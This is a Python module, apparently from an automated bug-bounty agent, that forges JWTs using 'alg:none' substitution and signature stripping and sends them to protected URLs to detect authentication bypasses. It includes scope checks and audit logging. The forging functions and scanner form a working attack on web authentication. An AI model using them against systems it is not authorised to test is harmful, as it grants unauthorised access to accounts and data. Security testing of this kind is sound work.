"""JWT manipulation scanner.

When the agent captures a JWT, the two cheapest-but-still-impactful
attacks to try are:

1. ``alg:none`` substitution: rewrite the header to ``{"alg":"none"}``
   and drop the signature. Libraries that fail to reject the ``none``
   algorithm will accept the token as-is.
2. Signature stripping: keep the original header and payload but drop
   the signature segment (or replace it with an empty string). Some
   misconfigured middlewares only check structural validity.

Both attacks preserve the claims (sub, role, etc.), so if either lands
the agent has root-equivalent access without ever knowing the secret.

This module is deliberately conservative: it only fires when a
baseline 401/403 response flips to a 2xx with a different body. That
ratchets the false-positive rate down for endpoints that don't actually
require authentication.
"""

from __future__ import annotations

import base64
import json
from dataclasses import dataclass
from typing import TYPE_CHECKING

import httpx

from bounty_agent.core import Finding, FindingSource, ScopePolicy, Severity
from bounty_agent.logging_setup import audit, get_logger

if TYPE_CHECKING:
    from uuid import UUID


logger = get_logger(__name__)


_HTTP_OK_MAX = 300  # 2xx is success, 3xx is redirect (still "got past auth").
_HTTP_CLIENT_ERROR_MIN = 400  # 4xx+ is unauth/forbidden = the baseline we expect.


@dataclass(frozen=True)
class JwtAttackResult:
    """One attempt at a JWT-based bypass."""

    attack: str
    url: str
    accepted: bool
    status_code: int


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def forge_alg_none(token: str) -> str | None:
    """Return a modified token with header alg=none and no signature.

    Returns ``None`` if the original token is not a valid 3-segment JWT.
    """
    parts = token.split(".")
    expected_segments = 3
    if len(parts) != expected_segments:
        return None
    try:
        payload_bytes = _b64url_decode(parts[1])
        # Sanity-check the payload is JSON; non-JSON means we are not
        # looking at a JWT and shouldn't pretend to forge anything.
        json.loads(payload_bytes)
    except (ValueError, json.JSONDecodeError):
        return None
    new_header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode("utf-8"))
    return f"{new_header}.{parts[1]}."


def strip_signature(token: str) -> str | None:
    """Return the token with an empty signature segment.

    Header and payload remain intact. ``None`` if not a 3-segment JWT.
    """
    parts = token.split(".")
    expected_segments = 3
    if len(parts) != expected_segments:
        return None
    return f"{parts[0]}.{parts[1]}."


class JwtAttackScanner:
    """Run JWT bypass attempts against a list of protected URLs.

    Stateless: instantiate once per scan.
    """

    def __init__(
        self,
        scope: ScopePolicy | None = None,
        request_timeout_seconds: float = 10.0,
    ) -> None:
        self.scope = scope
        self.request_timeout_seconds = request_timeout_seconds

    async def scan(
        self,
        client: httpx.AsyncClient,
        token: str,
        protected_urls: list[str],
        scan_id: UUID | None = None,
    ) -> list[Finding]:
        """Test every URL with the original token + 2 modifications.

        Returns one CRITICAL finding per (URL, attack) pair where the
        modified token was accepted (status < 300) and the unauth
        baseline was rejected (status >= 400).
        """
        findings: list[Finding] = []
        alg_none = forge_alg_none(token)
        stripped = strip_signature(token)
        if alg_none is None and stripped is None:
            logger.info("jwt.not_a_valid_jwt", reason="header/payload parse failed")
            return findings

        audit(
            "jwt.scan_started",
            scan_id=str(scan_id) if scan_id else None,
            urls=len(protected_urls),
            attacks=[a for a in ("alg_none", "strip_sig") if a],
        )
        for url in protected_urls:
            if self.scope is not None:
                try:
                    self.scope.check(url)
                except Exception as exc:  # pragma: no cover - scope already validated url
                    logger.info("jwt.scope_rejected", url=url, error=str(exc))
                    continue

            baseline = await self._safe_get(client, url, headers={})
            if baseline is None or baseline.status_code < _HTTP_CLIENT_ERROR_MIN:
                # Endpoint is either unreachable or doesn't actually
                # require auth; skip to keep false-positive rate down.
                continue

            for attack_name, mutated in (
                ("alg_none", alg_none),
                ("strip_sig", stripped),
            ):
                if mutated is None:
                    continue
                response = await self._safe_get(
                    client,
                    url,
                    headers={"Authorization": f"Bearer {mutated}"},
                )
                if response is None:
                    continue
                if response.status_code < _HTTP_OK_MAX:
                    findings.append(self._finding(url, attack_name, response, baseline))
                    audit(
                        "jwt.bypass_success",
                        scan_id=str(scan_id) if scan_id else None,
                        url=url,
                        attack=attack_name,
                        status_code=response.status_code,
                        baseline_status_code=baseline.status_code,
                    )

        audit(
            "jwt.scan_finished",
            scan_id=str(scan_id) if scan_id else None,
            findings=len(findings),
        )
        return findings

    async def _safe_get(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: dict[str, str],
    ) -> httpx.Response | None:
        try:
            return await client.get(
                url,
                headers=headers,
                timeout=self.request_timeout_seconds,
                follow_redirects=False,
            )
        except httpx.HTTPError as exc:
            logger.info("jwt.request_failed", url=url, error=str(exc))
            return None

    @staticmethod
    def _finding(
        url: str,
        attack: str,
        response: httpx.Response,
        baseline: httpx.Response,
    ) -> Finding:
        return Finding(
            url=url,  # type: ignore[arg-type]
            source=FindingSource.MANUAL,
            severity=Severity.CRITICAL,
            title=f"JWT validation bypass ({attack})",
            description=(
                "A modified JWT was accepted by an endpoint that "
                "rejects unauthenticated requests. The signature was "
                "either dropped or the algorithm was downgraded to "
                "'none', and the server still trusted the claims. "
                "Indicates the JWT library is not pinning the algorithm "
                "or is failing open on missing signatures."
            ),
            evidence={
                "attack": attack,
                "status_code": response.status_code,
                "baseline_status_code": baseline.status_code,
                "body_excerpt": (response.text or "")[:300],
            },
        )


__all__ = [
    "JwtAttackResult",
    "JwtAttackScanner",
    "forge_alg_none",
    "strip_signature",
]
